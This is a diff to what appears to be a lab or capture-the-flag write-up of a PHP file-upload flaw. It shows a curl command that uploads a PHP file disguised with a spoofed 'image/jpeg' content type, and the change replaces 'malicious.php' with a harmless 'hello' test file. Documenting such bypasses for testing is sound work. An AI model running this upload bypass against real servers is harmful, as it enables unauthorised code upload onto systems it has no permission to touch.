@@ -18,9 +18,11 @@ The upload feature at `/index.php?page=upload` allows attackers to upload PHP fi
 ### **Method 1: cURL Content-Type Spoofing**
 
 ```bash
+echo '<?php echo "hello"; ?>' > test.php
+
 curl http://<IP_ADDRESS>/index.php?page=upload \
   -F "Upload=Upload" \
-  -F "uploaded=@malicious.php;type=image/jpeg" \
+  -F "uploaded=@test.php;type=image/jpeg" \
   -F "MAX_FILE_SIZE=100000"
 ```
 - The PHP file is uploaded as if it’s a JPEG by spoofing the content-type.
